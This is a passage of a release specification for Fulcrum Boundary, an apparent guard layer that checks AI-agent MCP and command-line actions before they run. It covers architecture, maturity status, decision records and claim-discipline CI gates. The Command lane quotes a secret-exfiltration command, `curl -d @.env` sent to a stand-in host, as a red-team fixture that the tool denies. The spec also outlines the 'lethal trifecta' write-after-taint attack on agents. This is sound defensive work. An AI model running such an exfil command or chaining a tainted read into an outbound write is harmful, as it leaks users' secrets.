The release is **two demoed lanes**, each fixture-only — not breadth-as-features. The **canonical spine table** (statuses, demos, verified verdict shapes, evidence) is **§4.0**. In short: Lane 1 = **MCP** (`production`, `boundary demo github-lethal-trifecta`, `upstream_called=false`); Lane 2 = **Command/CLI** (`delivered-preview`, `boundary demo command-secret-exfil`, `executed=false`). Do not cut the proof path; cut breadth first. All other adapters remain `delivered-preview`/`preview`, never headline. (C4/C5; see §4.0, §4.2.)

## 3.7 One-screen architecture diagram (Mermaid)

```mermaid
flowchart TB
    subgraph Entrypoints["Four surfaces — one decision core"]
        CLI["A. boundary CLI<br/>(~29 commands · delivered)"]
        SDK["B. Go SDK<br/>(governance + policyeval · delivered)"]
        GW["C. HTTP MCP Gateway<br/>(boundary serve · production)"]
        GHA["D. GitHub Action<br/>(mcp-audit → SARIF · delivered CI-local)"]
    end

    Agent["AI agent intent<br/>→ proposed action on a real system"] --> Route

    Route{"Routed through<br/>Boundary?"}
    Route -- "no: direct PATH binary,<br/>CI/SSH/editor terminal,<br/>arbitrary route" --> Bypass["UNGOVERNED (known bypass)<br/>routed-only doctrine · §10.0"]
    Route -- "yes" --> Entrypoints

    CLI --> P
    SDK --> P
    GW --> P
    GHA -. "audit/inventory path" .-> P

    subgraph P["governance.Pipeline.Evaluate — four ordered stages"]
        direction TB
        S1["1 · Trust check<br/>(opt-in; error → fail-closed deny)"] --> S2
        S2["2 · Static policies<br/>(glob + field match)"] --> S3
        S3["3 · Domain interceptors<br/>(SQL parse · path allow-list · rate limit)<br/>error → fail-closed deny"] --> S4
        S4["4 · PolicyEval engine<br/>(11 conditions · error → per-transport<br/>fail-closed / fail-open)"]
    end

    P --> Verdict{"Verdict<br/>(exactly one)"}
    Verdict --> ALLOW["allow"]
    Verdict --> DENY["deny"]
    Verdict --> WARN["warn"]
    Verdict --> ESC["escalate<br/>(mode: classified)"]
    Verdict --> REQ["require_approval"]

    DENY --> Block["Blocked BEFORE the tool executes"]
    ALLOW --> Forward["Forwarded to the tool"]

    Verdict --> Audit["Decision record (hash-verifiable)<br/>emitted exactly once · before dry-run conversion<br/>'decision record', never 'proof of verdict'"]

    classDef bypass fill:#fde,stroke:#c33,color:#600;
    classDef prod fill:#dfe,stroke:#393,color:#060;
    class Bypass bypass;
    class GW prod;
```

**Diagram reading (load-bearing):**
- The **Route gate** is the routed-only doctrine (§10.0): anything not passing through Boundary is an **explicit, named bypass**, not a silent gap.
- All four surfaces converge on the **same `governance.Pipeline`** — "Boundary decides" identically everywhere. (R1)
- The verdict is **exactly one of five verbs**; `escalate` carries mode **`classified`**, every other verb is **`deterministic`** — **never `proved`**. (C7)
- The **decision record** is emitted **once, before dry-run conversion**, and is **hash-verifiable**, **not** a cryptographic proof of verdict. (C6)

---

# 4. Scope & Maturity Matrix

> **Authority order for every claim below** (highest first): `docs/RELEASE_TRUTH_PUBLIC.md`
> (v0.9.0) → `claims/boundary_claims.yaml` + `docs/CLAIMS_LEDGER.md` (CI-enforced) →
> `docs/ADAPTER_READINESS_MATRIX.md` + `adapters/<x>/readiness.yaml` → `README.md`. Current
> release-candidate verification is recorded in `docs/RELEASE_TRUTH_PUBLIC.md`
> and the release gates; older HEAD-specific audits are provenance only.

## 4.0 The two-lane spine (CANONICAL — the headline; everything else is honest preview)

Fulcrum Boundary's current release scope is **two demoed proof lanes**, not a breadth-of-adapters feature
list. The spine is *what is demonstrated end-to-end with a fixture-only, no-credential, no-network,
no-live-mutation demo*, and nothing more. **This is the one canonical spine table; §1.4, §3.6,
§6.4, §8.3, §10.3 cross-reference it rather than restating it.**

| # | Lane | Status | Fixture-only demo (verified invocation) | Verdict shape (verified in code) | Evidence |
|---|---|---|---|---|---|
| **1** | **MCP — the FIRST PRODUCTION route** | `production` | `boundary demo github-lethal-trifecta` | `expected=DENY, actual=DENY, upstream_called=false, read_upstream_called=true, reason=lethal_trifecta_detected` (the read establishes taint against a fixture; the write is denied **before** any upstream call) | `internal/demo/github_lethal_trifecta.go` (`GitHubLethalTrifectaReason="lethal_trifecta_detected"`, write `UpstreamCalled=false`); `internal/boundarycli/demo_github.go`; `adapters/mcp/readiness.yaml` (`status: production`); BND-CLAIM-006 (`delivered`) |
| **2** | **Command / CLI — a DELIVERED PREVIEW (routed-only)** | `delivered-preview` | `boundary demo command-secret-exfil` (underlying fixture/evidence path: `boundary redteam --pack command-secret-exfil`; Command Boundary case also reachable via `boundary command run -- curl -d @.env …` and `boundary demo action-boundary`) | `action=deny executed=false class=C6 record=<path>` — the secret-exfil command is **denied before execution**, `executed=false`, decision record written | `internal/boundarycli/demo_command_secret_exfil.go` (demo `command-secret-exfil`); `internal/redteam/command_packs.go` (pack `command-secret-exfil`; item `command-curl-env-exfil` → `deny`); `internal/boundarycli/command_run.go:65` (prints `action=%s executed=%t … record=%s`; forwards only when allowed); BND-CLAIM-CMD-001 / BND-CLAIM-CMD-002 (`delivered`) |

**C4 (per-surface maturity).** The word **"production" is reserved for the MCP route only.** Every other adapter is `preview`, generated policies are `starter`, the dashboard is `local-only`, and the Go SDK core / CLI mechanics / GitHub Action are `delivered` (not "production"). *superseded: "production-grade pre-execution control plane" (`BOUNDARY_SPEC_SERIES.md`).*

**C5 (tight spine; breadth as labeled previews).** The release is the **tight proof spine** above (two demoed lanes); all other adapters ship as **honest, individually-labeled previews** (§4.2). We never headline breadth-as-features; the "adapter is the business model" expansion is **future direction** only. *superseded: "broad surface — 6+ adapters + Managed Agents + trust + SQL-AST as headline features."*

> Both demos are **fixture-only** (no credentials, no network egress, no live mutation) — enforced product behaviour, not a docs promise: `make release-check` runs `boundary selftest` and `boundary demo github-lethal-trifecta` green, and the redteam packs are declared fixture-only (BND-CLAIM-014, BND-CLAIM-CMD-002, `delivered`).

## 4.1 Maturity taxonomy (the readiness gate)

Status values are defined by the in-repo readiness gate (`docs/ADAPTER_READINESS_MATRIX.md`, enforced by `tests/adapter_conformance`). The gate is itself a differentiator: it **fails the build** when an adapter is missing a `readiness.yaml`, omits one of the ten lifecycle steps, or is listed `production` without conformance evidence. (Spec-status ↔ ledger mapping is the canonical legend in §0.)

The ten lifecycle steps: `parse`, `identify`, `evaluate`, `deny`, `forward`, `inspect`, `metadata`, `record`, **`bypass_proof`**, `fail_closed`. Step states: `implemented`, `delegated`, `not_applicable`, `stub`.

**The uniform gap to production is `bypass_proof`.** Across *every* preview adapter, the single step holding it below production is `bypass_proof: delegated` (owner = deployment topology / credential boundary). Boundary's pipeline, deny, and fail-closed logic are real and tested; what is **not** proven in-repo is that the deployment has no direct tool path around Boundary. That is a deployment-topology guarantee, not a code defect — it is exactly the routed-only doctrine (§10.0).

## 4.2 The honest preview matrix (every adapter except MCP)

The authoritative per-surface status table — the union of the eight `adapters/<x>/readiness.yaml` declarations and the Command/Edit Boundary surfaces in `docs/RELEASE_TRUTH_PUBLIC.md`. **MCP is the only `production` row; it is the spine, not a matrix entry.** Managed Agents carries `target_status: production` but **ships `preview`** — target status is roadmap, never a current release claim.

| Surface | Status | Lifecycle gap holding it below production | Key gap ID | Evidence (readiness.yaml + claim) |
|---|---|---|---|---|
| **MCP** *(spine — production)* | `production` | `bypass_proof: delegated`, `record: delegated` — only deployment topology remains | — | `adapters/mcp/readiness.yaml`; BND-CLAIM-006 (`delivered`) |
| **Command Boundary** *(spine — delivered-preview, routed-only)* | `delivered-preview` | Deployment evidence the Boundary wrapper is the **sole** command path | BND-CLI-002 | `adapters/cli/readiness.yaml`; BND-CLAIM-CMD-001/002 (`delivered`) |
| **Edit Boundary** | `delivered-preview` | Deployment evidence edit proposals route only through Boundary edit envelopes | — | `docs/RELEASE_TRUTH_PUBLIC.md`; BND-CLAIM-EDIT-001/002 (`delivered`) |
| **Secure GitHub** *(Secure MCP profile, not a transport)* | `preview` | Deployment bypass evidence + broader live coverage; opt-in live conformance proves the denied-write no-mutation path, **not** bypass resistance | BND-GH-002 | `adapters/securegithub/readiness.yaml`; BND-CLAIM-015/018 (`delivered`), BND-CLAIM-019 (`partial`) |
| **CLI (transport adapter)** | `preview` | Sole-wrapper deployment evidence | BND-CLI-002 | `adapters/cli/readiness.yaml` |
| **CodeExec** | `preview` | A **real named sandbox boundary** (container / WASM / microVM / OS sandbox) with integration tests + bypass proof; **no secure sandboxing claimed** | BND-CODE-001 | `adapters/codeexec/readiness.yaml` |
| **gRPC** | `preview` | Unary lifecycle works with governance trailers; **streaming** needs per-message lifecycle tests + deployment bypass evidence | BND-GRPC-001 | `adapters/grpc/readiness.yaml` |
| **A2A** | `preview` | Governed against a documented protocol snapshot; production needs **live** protocol conformance + deployment bypass evidence | BND-A2A-002 | `adapters/a2a/readiness.yaml` |
| **Managed Agents** | `preview` (`target_status: production`) | A **live upstream Managed Agents conformance run with operator-owned credentials** | BND-MAPROD-001 | `adapters/managedagents/readiness.yaml`; BND-CLAIM-007 (`partial`) |
| **Webhook** | `preview` | Informational (post-execution audit) and execution (pre-approval) modes split; production needs sole-downstream-path deployment evidence | BND-WEB-001 | `adapters/webhook/readiness.yaml` |

Supporting capabilities (not adapters, included for scope completeness):

| Capability | Status | Release truth | Evidence |
|---|---|---|---|
| Local MCP inventory / risk graph | `delivered` (read-only) / `starter` (graph+policies) | Inventory is read-only & classification-only; risk graphs and generated policies are starter/operator-review | BND-CLAIM-011/012 (`delivered`) |
| Generated policies | `starter` | Starter policies for operator review; **not** production-complete | BND-CLAIM-012 (`delivered`) |
| Decision records | `delivered` | Hash-verifiable; signed receipts **not** implied by default (§6 / C6) | BND-CLAIM-002/005 (`delivered`) |
| Dashboard | `local-only` | Local-only visibility over local artifacts; **not** hosted monitoring | BND-CLAIM-016 (`delivered`) |
| GitHub Action (`actions/mcp-audit`) | `delivered` (CI-local) | Repo-local MCP config audit → Markdown + optional SARIF | BND-CLAIM-017 (`delivered`) |
| Postgres AST guard | `delivered` (scoped) | Statement classification before PolicyEval — **not** universal SQL protection; **not** a "SQL firewall" | BND-CLAIM-008 (`delivered`); BND-CLAIM-004 = **`false`** ("SQL firewall" banned) |
| Adaptive trust (standalone + Redis) | `delivered` (scoped) | Trust integration + adaptive termination scoped to protected adapters | BND-CLAIM-009 (`delivered`) |

**Killed outright (so it cannot return):** the **"SQL firewall"** framing — BND-CLAIM-004 = `false`; the exact phrase is banned from public copy. The Postgres AST guard is statement *classification* only.

## 4.3 Routed-only scope for the matrix (pointer to §10.0)

Every preview row above is held below `production` by the same thing: **deployment-bypass proof**. The doctrine and the FORBIDDEN public-capability list ("global shell control" / "all CLI activity protected" / "governs every way an agent can mutate") are stated canonically in **§10.0** and the replacement table in **§12.3**; this matrix does not restate them. (C9)

---

# 5. Standalone & Integration Contract

> **Locks C3** (with supporting cross-refs to C10). Current release-candidate
> verification is recorded in `docs/RELEASE_TRUTH_PUBLIC.md` and the release
> gates; older HEAD-specific audits are provenance only.

## 5.1 Standalone OSS is the product (C3)

The release ships a **standalone, downloadable Apache-2.0 OSS tool** with **zero private-repo dependency.** Kernel mode survives **only as a documented contract surface**, never as a release dependency. The release must not require any sibling repo (fulcrum-io, fulcrum-trust, Fulcrum-Proofs) to be present, built, or reachable. *superseded: the "out-of-process enforcement boundary of the Fulcrum kernel (Redis/NATS/trust/proofs)" framing (`SPEC_RECONCILIATION.md` C3 Position A).*

## 5.2 Zero private-repo dependency — proven, not asserted

Backed by read-only verification in `CROSS_REPO_DEPS.md` (offline build + empty
Fulcrum-module `go mod graph`) and re-confirmed by the current release gate:

| Check | Result |
|---|---|
| `github.com/fulcrum-governance/*` Go imports (excl. self) | **0** (one string-literal URL in `internal/firewall/report.go`, not an import) |
| `replace` directives to a private/external repo | **0** — all 7 are self-referential (`../../`, local monorepo) |
| `go mod graph` edges to a non-self Fulcrum module | **0** |
| `go build ./...` offline (`GOPROXY=off -mod=readonly`) | **SUCCESS** (all 43 packages) |
| `go build ./cmd/boundary` offline, default CGO | **SUCCESS** — 29.2 MB binary (the `go install` path) |
| `.proto` / `buf.*` / `.gitmodules` | **none** |
| Reverse dep — does fulcrum-io import Boundary? | **0** — release is unidirectionally safe |

**Why it is decoupled (the `policyeval` story):** Boundary ships its **own complete, self-contained copy** of `policyeval` (8 files, pure stdlib + `testify` test-only) keyed on a **hand-rolled local `EvaluationContext`** rather than fulcrum-io's generated `policyv1.EvaluationContext` proto. That single choice is *why* Boundary has no proto/buf and no io dependency (`CROSS_REPO_DEPS.md`).

**Honest counter-note (truth > agreement):** the same `policyeval` fork that *enables* standalone buildability is a **maintenance liability** — a policy-semantics fix in one repo does not propagate to the other (~68 lines diverged in `evaluator.go`). This is a **future maintenance item, not a release blocker**, and the fix is emphatically **NOT** to make the OSS repo depend on the private repo (§11.2).

## 5.3 No runtime dependency on any Fulcrum service

An external user runs Boundary with **no Fulcrum backend at all.** References to trust / io / proofs in tracked code are **informational only**, never coupling: `governance/decision_mode.go:17` (comment), `governance/standalone/standalone.go` (`StaticProofCorrespondence` — static metadata strings; nothing fetched/imported/executed), `internal/firewall/report.go:172` (SARIF `InformationURI` = public GitHub URL string). `TrustChecker` is an **interface** (`governance/trust.go`); the absent-state default is `TrustStateTrusted`, and the only shipped implementation reference is the local Redis example (`examples/redis-trust` — never in the product binary).

## 5.4 Kernel mode = documented contract surface only (C3)

Kernel / out-of-process integration is **a contract surface, not a shipped dependency.** Status: `delivered` as a *contract description* (BND-CLAIM-010: "Standalone and kernel integration contracts remain contract surfaces"). The release product does **not** connect to a kernel, Redis, NATS, or any control plane to deliver value. It **fails hard on incomplete kernel configuration** by design — Boundary must not start half-connected, which could silently turn an intended fail-closed deployment into a local one.

## 5.5 Distribution & install contract (supports C3; cross-refs C10)

| Item | Contract | Status | Evidence |
|---|---|---|---|
| Install path | `go install github.com/fulcrum-governance/fulcrum-boundary/cmd/boundary@v0.9.0` | repeatable release target | `docs/RELEASE_TRUTH_PUBLIC.md`; README |
| Go toolchain | **Go 1.25+** required | hard requirement | `go.mod` `go 1.25.0` |
| **C-toolchain prerequisite** | Default `go install` needs a **C compiler present** (CGO on): `cmd/boundary` → `interceptors/sql` → `pganalyze/pg_query_go/v6` is **CGO with no `nocgo` fallback**. `CGO_ENABLED=0` build **fails**. The shipped `Dockerfile` builds with `CGO_ENABLED=1` plus a C toolchain; the README states the prerequisite. | build caveat (B-1, resolved) | `CROSS_REPO_DEPS.md` B-1; `Dockerfile` (`CGO_ENABLED=1`, `build-base`); verified `CGO_ENABLED=0 go build ./cmd/boundary` fails (`undefined: pg_query.Parse`) |
| Hosted / package-manager distribution | **None claimed** — no Homebrew, no package manager, no hosted monitoring | forbidden to claim | `docs/RELEASE_TRUTH_PUBLIC.md` |

> The README **states the C-toolchain prerequisite** for the default install path,
> and the `Dockerfile` builds with CGO on (B-1, resolved) — so no broken
> static-binary promise ships. (See §10.)

---

# 6. Decision Records & Proof Boundary

> **Section scope:** locks **C6**, **C7**. The Claims & Truth Discipline machinery (C8, C10) is in
> **§7**. Ground truth is the current repo plus the release gates recorded in
> `docs/RELEASE_TRUTH_PUBLIC.md`. This section is written to pass
> `claims/claims_test.go` and `claims/language_lint_test.go`. (The C6/C7 lock
> statements are in §1.6 and the master table; this section is the mechanics.)

This is the truth-discipline spine. For Boundary, **honest scope is the product differentiator** — the claims ledger, the language lint, the public-surface guard, and the "what it does NOT prove" tables are features, not disclaimers. Lead with them.

## 6.1 The decision artifact is a "decision record" (C6)

**Locked term: decision record.** Never "receipt" as the primary noun in public copy; never "cryptographic proof of verdict"; never "signed receipt."

When Boundary reaches a verdict on a governed route, it emits one structured **decision record**. The record is **hash-verifiable**: it carries a SHA-256 decision hash over a canonical encoding, and `boundary verify-record` recomputes and compares it (and, given the inputs, the request hash, policy-bundle hash, and binary digest). **Status:** `delivered`.

- Emission — `BND-CLAIM-002` → `governance/slog_audit_test.go`; doc `docs/DECISION_RECORDS.md`.
- Hash-verifiability — `BND-CLAIM-005` "receipt-grade decision records" (ledger-internal phrasing; see §6.3) → `tests/receipt_verification_test.go`, `internal/boundarycli/cli_test.go`; doc `docs/RECEIPTS.md`.
- Mechanism — `governance/receipt.go`: `ComputeDecisionHash` (SHA-256 over canonical JSON, `"sha256:"`-prefixed), `VerifyDecisionRecord`, `BuildDecisionRecord`.

**What it binds** (`BuildDecisionRecord` / `ComputeDecisionHash`): schema version, timestamp, Boundary version + build digest, adapter/transport, agent/tenant/trace IDs, tool + action, reason, **decision mode** (§6.5), matched rule, policy file + **policy-bundle hash**, **request hash** (and raw-shape hash), trust score/state, and the computed **decision hash**. The hash is computed with the record ID, decision hash, and any signature fields zeroed first — so `verify-record` is deterministic over semantic content.

### What a decision record is NOT (the forbidden boundary)

| Forbidden public claim | Why forbidden | Ledger anchor |
|---|---|---|
| "cryptographic proof of verdict" | No signing in the default path; a hash is integrity, not proof of authorship | `BND-CLAIM-002/005` forbidden |
| "signed receipt" / "signed receipt by default" | The signer is an **unwired optional seam** (§6.2); default records are **unsigned** | `BND-CLAIM-005` forbidden |
| "tamper-proof record" | Hash detects drift on a record you hold; it does not defend a record you do not control | `BND-CLAIM-002` forbidden |

**Approved public phrasings:** "Every governed verdict produces a structured decision record." (`BND-CLAIM-002`) · "Boundary records the verdict and reason for the governed route." (README l.40) · "Bundle and verify local receipts. Receipts do not prove production safety by themselves." (README l.102 — the caveat satisfies the language lint).

## 6.2 Signing is an unwired seam — signed receipts are NOT implied (C6, verified)

The sharpest honesty point in the section, verified directly in source. A signing **interface** and an **Ed25519 implementation** exist, but **no signing is wired into the default decision-record path**:

- `governance/receipt_signer.go` defines `ReceiptSigner` (interface) and `Ed25519ReceiptSigner`.
- **Verified live:** both have **zero non-test constructors and zero non-test callers** outside `receipt_signer.go`. The pipeline and audit-emission path never reference a `ReceiptSigner`.
- The `Signature` / `SignatureKeyID` fields are `json:"...,omitempty"`, populated **only** from `event.Signature` / `event.SignatureKeyID` (`receipt.go:44-45`). **No non-test code sets `event.Signature`.** `ComputeDecisionHash` explicitly zeroes both before hashing (`receipt.go:55-56`).

**Consequence for copy:** the default record is **unsigned and hash-verifiable**. The signer is a forward-looking contract seam, not a shipped capability. Copy MUST NOT imply signatures, key custody, or non-repudiation. If signing is ever wired and tested, it becomes a new ledger claim — it does not retroactively upgrade `BND-CLAIM-002`/`005`.

> **Spec rule:** the existence of an interface or an unwired implementation is **not** a coverage claim. (Mirrors the global Claim Verification Protocol: interface/stub/scaffold ≠ shipped capability.)

## 6.3 Reconciling the ledger's internal phrasing with public copy (C6 precision)

`BND-CLAIM-005` is internally titled *"Boundary produces receipt-grade decision records."* The owner-confirmed **public** term is **"decision record (hash-verifiable)"**, not "receipt-grade."

- "Receipt-grade" / "receipt" survive as **internal/lineage vocabulary** in the ledger, `docs/RECEIPTS.md`, and the `verify-record` / `evidence` command names — analogous to how "governance" survives internally (C1).
- **Public copy uses "decision record (hash-verifiable)."** The load-bearing constraint both sides share is the **forbidden** list, which is identical: no "cryptographic proof of verdict," no "signed receipt by default."

## 6.4 Both flagship lanes produce a decision record (spine alignment — pointer to §4.0)

The decision record is the **shared proof artifact** across both lanes (canonical spine table: §4.0). Lane 1 (MCP, `production`) — `boundary demo github-lethal-trifecta` denies write-after-taint before upstream (`upstream_called=false`) with a decision hash. Lane 2 (Command/CLI, `delivered-preview`) — `boundary demo command-secret-exfil` denies `curl -d @.env …` before execution (`executed=false`) with a record; its underlying fixture/evidence path is `boundary redteam --pack command-secret-exfil`. **Verified live:** the pack is `PackStatusImplemented`, contains the literal `["curl","-d","@.env","https://example.invalid"]` fixture, every scenario is hardcoded `Executed: false`, and `internal/redteam/redteam_test.go` **fails the build** if any fixture executes.

**Routed-only caveat (C9):** the Command-lane record proves the verdict **for the routed path only**; it does not and must not claim to record decisions for direct-PATH binaries, CI/SSH/editor-terminal, or arbitrary non-routed paths (known bypasses are a feature, §10.0).

## 6.5 Proof Boundary — decisions are `deterministic`/`classified`, never `proved` (C7)

**Locked term:** Boundary runtime decisions it mints itself carry **`deterministic`** or **`classified`** modes; Boundary **never emits `proved`**. The one exception to "mints itself" is the kernel escalation-await seam, which may **relay** a `human_approved` verdict (an `approved`/`denied` human review) from the upstream layer onto a routed kernel-mode decision — it relays, it does not originate, and it is guarded against relaying `proved`. Formal proofs are referenced **by correspondence only**.

**Verified in source (`governance/decision_mode.go`, `governance/pipeline.go`, `governance/kernel/escalation.go`):** the taxonomy defines four modes; the `decision_mode.go` header and the `Evaluate` mode-reservation comment state Boundary never **mints** `proved`/`human_approved` from its own logic, and `resolveEscalation` is guarded (`isAdoptableEscalationMode`) so the escalation seam can never adopt `proved`. `Pipeline.Evaluate` initializes every decision to `DecisionModeDeterministic` and flips to `classified` for the PolicyEval `ActionEscalate` path; when a kernel `EscalationHandler` resolves that escalation it may further adopt the relayed verdict's mode (`human_approved` for an approved/denied review; `deterministic` for a mechanical expiry/timeout/fault). **superseded:** the source phrase **"never originate here"** (the pipeline comment was rewritten to the relay framing) and the framing that the escalate path flips to `classified` **only** — with a handler configured it can resolve to `human_approved` or `deterministic`. The `proved`-never-emitted invariant below is unchanged.

**Proof by correspondence.** `docs/PROOF_BOUNDARY.md` is the authority; its first sentence is the rule: *"Boundary uses proof correspondence as a design constraint, not as a runtime certificate. Boundary does not emit `proved` decisions."* The correspondence table maps Boundary behaviors (budget-denial; trust-isolation/termination bands at 0.30 / 0.60; privilege-subset; absorbing terminated state) to named Lean 4 theorems in the **separate** `Fulcrum-Proofs` repo, all correspondence type **`design`** — *"the runtime behavior was designed to satisfy the proved invariant; it does not mean the Go implementation was mechanically extracted from Lean."* The proofs repo is **not** a build or runtime dependency of the OSS release (C3).

### What proof correspondence does NOT claim (carry into copy)

`PROOF_BOUNDARY.md` "Scope Boundary": *"The proof lineage does not prove that every deployment is safe. Deployment isolation, credential custody, policy quality, live service availability, and operator configuration are still operational responsibilities."*

| Forbidden public claim | Anchor |
|---|---|
| "Boundary emits proved decisions" | `BND-CLAIM-010` forbidden; `decision_mode.go`; `language_lint` "runtime proof overclaim" |
| "Boundary mechanically extracts runtime code from Lean proofs" | `BND-CLAIM-010` forbidden; `PROOF_BOUNDARY.md` |
| "Boundary's verdicts are formally verified / proved correct" | `PROOF_BOUNDARY.md` scope boundary |
| Leading with formal verification as the product hook | positioning rule (proof is a credibility layer *after* the boundary is understood, never the hook) |

**Approved phrasing:** "Boundary's runtime behavior is designed to satisfy formally proved invariants from the Fulcrum proofs project (budget, trust-termination, privilege-subset), referenced by correspondence. Boundary itself emits `deterministic` and `classified` decisions, not `proved` ones."

---

# 7. Claims & Truth Discipline

> **Section scope:** locks **C8**, **C10**; documents the claims ledger, language lint,
> public-surface guard, and authority order. (Lock statements are in §1.7/§1.9 and the master table;
> this section is the machinery.)

## 7.1 The three enforcement gates (how truth is mechanically held)

Boundary binds public language to repo evidence through **three CI-blocking gates** (all in `.github/workflows/ci.yml`, verified). This machinery is the differentiator — describe it openly.

**Gate 1 — The claims ledger (`claims/claims_test.go`, `claims/forbidden_test.go`).** `claims/boundary_claims.yaml` is the machine-readable ledger (39 entries, verified), rendered for humans at `docs/CLAIMS_LEDGER.md`. `TestBoundaryClaimsLedger` parses it and **fails the build** on any violation:
- Every claim has a unique non-empty `id` and `claim` text (duplicate IDs fail).
- `status ∈ {delivered | partial | planned | false}` (any other value fails).
- **`delivered`** → must have **≥1 test path AND ≥1 doc path**, and **every referenced path must exist on disk** (`os.Stat`). A missing evidence file fails the build.
- **`partial`** → must list **≥1 gap**; each gap ID must match `^BND-[A-Z0-9]+-[0-9]{3}$` with a `description` and `spec` reference.
- **`false`** → the claim text **must not appear in `README.md`** (the build greps and fails if present).
- **`public_language.forbidden`** lists are **advisory** — each entry names a capability framing a claim must never assert. They are governed in public copy by the Gate-2 lint and human review, **not** literally substring-scanned against docs (concept words like `signature`/`decision hashes` appear legitimately in hedged copy, so literal enforcement would brick truthful text). They are still machine-checked: `claims/forbidden_test.go` (`TestForbiddenListIntegrity`, `TestForbiddenLintSync`) **fails the build** on an empty entry, a within-claim duplicate, an entry that is also `allowed`, or drift between the forbidden phrases that double as lint terms and `publicLanguageRules()`. Sentence-form forbidden phrases that are *not* also hardcoded lint terms are review-governed, not document-scanned — opt-in literal enforcement of that safe subset is a documented follow-up, intentionally not yet adopted.

> **Status vocabulary → public-use rule.** `delivered` may be used in copy without caveat **only** for uncaveated `delivered` claims; routed-only and local-only claims must carry their scope sentence. `partial` may be used **only** with the YAML gap/maturity caveat. `planned` is **never** stated as current behavior. `false` is **never** a public claim (build-checked absent from README). Per C4, the word **production** is reserved for the **MCP route only** (`BND-CLAIM-006`); the single `false` claim is `BND-CLAIM-004` "SQL firewall" — killed.

**Gate 2 — The language lint (`claims/language_lint_test.go`).** `TestPublicLanguageLint` scans public docs line-by-line for **controlled overclaim phrases** and fails the build on an uncontrolled hit. **Scope:** `README.md`, `CHANGELOG.md`, `docs/*.md` + `docs/{adapters,firewall,secure-mcp,policies,deployment}/*.md`. **Language-control files are exempted** (they must quote the forbidden phrases to govern them): `docs/CLAIMS_LEDGER.md`, `docs/COPY_RULES.md`, `docs/LANGUAGE_SYSTEM.md`, `docs/LEXICON.md`, `docs/BOUNDARY_PRODUCT_PRIMITIVES.md`, `docs/LAUNCH_TRUTH_FREEZE.md`, `docs/RELEASE_TRUTH_RECONCILIATION.md`.

Controlled rules (verified): generic platform lead (`AI governance platform`, headline-only) · SQL firewall overclaim · universal prompt-injection overclaim · universal agent safety overclaim · runtime proof overclaim (`proved decision[s]`) · secure sandbox overclaim · adapter maturity overclaim (`all/six/seven … production adapters`) · unverified competitive claim · GitHub production overclaim. A line is allowed when it also contains a **negated/controlled** token: `not `, `do not `, `does not `, `must not `, `avoid `, `false`, `forbidden`, `prohibited`, `without `, `unless `, `until ` (the secure-sandbox rule also allows explicit sandbox-caveat phrasing). **This is why the "What It Does Not Prove" tables are safe to write — the limitation framing is exactly what the lint requires.**

**Gate 3 — The public-surface guard (`scripts/assert-no-internal-public-artifacts.sh`).** A CI step (`public-surface` job, verified) that greps public surfaces for **internal planning/session leakage** (paths like `/Users/td`, `CODEX_SESSION_LOG`, `.claude/sprint`, goal-tracking verbs, "Y Combinator", etc.) and **capture-instruction placeholders** ("terminal capture", "asciinema", "demo.tape", "ScreenFlow", etc.), failing on a hit. **Scope:** the guard enumerates **every tracked text file** via `git ls-files` (excluding only binaries, generated site output, and the guard script itself), so internal planning/session artifacts cannot re-accrete in any tracked path — `conductor/`, `scripts/`, `claims/`, `fixtures/`, and root files are all covered.

## 7.2 Authority order (the tie-breaker)

When two documents disagree about what may be claimed, resolve highest-wins (the canonical chain from the briefing): (1) `docs/RELEASE_TRUTH_PUBLIC.md` (v0.9.0); (2) `claims/boundary_claims.yaml` + `docs/CLAIMS_LEDGER.md` (**CI-enforced**; the binding floor); (3) `README.md` (v0.9.0); (4) `conductor/2026-05-29-…-reset-{design,plan}.md` (intent, polish only); (5) the language stack; (6) `docs/LAUNCH_TRUTH_FREEZE.md`; (7) `Fulcrum_Boundary_Vision.md` (direction only).

**Demote / do not cite as authority:** `BOUNDARY_SPEC_SERIES.md`, the "governance kernel / kernel-connected" framing, all GIL-named material, the per-version `RELEASE_TRUTH_V0xx` history.

**Operational rule:** the **ledger + the two test gates are the binding floor** — any sentence in a higher-prose document that contradicts a `delivered/partial/false` status or trips the language lint is wrong and must be corrected to match the ledger.

## 7.3 Vendor-neutral copy (C8)

Public copy names **no competitors and no third parties** — no brand in README, docs, release notes, or other public copy. Comparisons are framed by **category** ("scanners," "platforms," "policy substrates"), never by brand; the internal positioning lane stays out of the public spec. **External ingestion is Boundary-owned mapping** (e.g. `--source external-mcp`, "external MCP inventory NDJSON"), with the explicit disclaimer: **"not an official third-party integration or compatibility claim."** The `language_lint` "unverified competitive claim" rule backstops this, but the discipline is broader than its two literal phrases — **no brand names at all**, and none appear in this spec. One canonical mental model **may** be cited because it is a named public concept, not a vendor: the **"lethal trifecta"** (private data + untrusted content + external comms), cited to its origin and kept scoped to the tested write-after-taint path. **Forbidden:** any competitor brand; any "vs <vendor>"; any "compatible with / integrates with <vendor>" for external-ingest formats; any "X cannot do this / only we can." *superseded: any earlier named-competitor / named-third-party copy.*

## 7.4 Distribution — local + `go install` only (C10)

The only distribution channel for this release is local build + `go install`. The one canonical install line (matching the install path in the README):

```
go install github.com/fulcrum-governance/fulcrum-boundary/cmd/boundary@v0.9.0
```

- **No** "available on Homebrew," `brew install`, `apt`/`yum`/`apk`, `npm install`, `docker pull …`, or any package-manager / registry distribution claim (verified: README contains none).
- **No hosted/monitoring service.** The dashboard is **`local-only`**, reads **local artifacts only** (inventory, risk paths, policy status, install receipts, descriptor locks, local decision-record files), binds to loopback, and **rejects non-loopback serve addresses**.
- The C-toolchain prerequisite (§5.5) belongs with the install instructions.

**Status & evidence:** dashboard = `local-only`, `BND-CLAIM-016` → `internal/firewall/dashboard_test.go`, `tests/firewall/inventory_cli_test.go`. GitHub Action = CI audit/reporting only, `BND-CLAIM-017` (Markdown + SARIF; repo-local by default).

| Forbidden public claim (C10) | Ledger anchor |
|---|---|
| "hosted firewall dashboard" / "dashboard monitors production deployments" / "streams remote telemetry" | `BND-CLAIM-016` forbidden |
| "available via Homebrew / a package manager" | C10 (no ledger claim asserts a package-manager channel) |
| "Boundary Action protects MCP servers at runtime" / "installs the gateway" | `BND-CLAIM-017` forbidden |

## 7.5 The "What It Does NOT Prove" table (the differentiator, ship it)

Claim-safe by construction (every line is negated/limitation framing, which the lint requires). Consolidates the forbidden boundaries into one operator-facing artifact.

| Boundary does NOT prove / claim | Why (the honest scope) | Anchor |
|---|---|---|
| It does not emit **proved** decisions | Decisions are `deterministic`/`classified`; proofs are correspondence-only | `decision_mode.go`, `PROOF_BOUNDARY.md`, C7 |
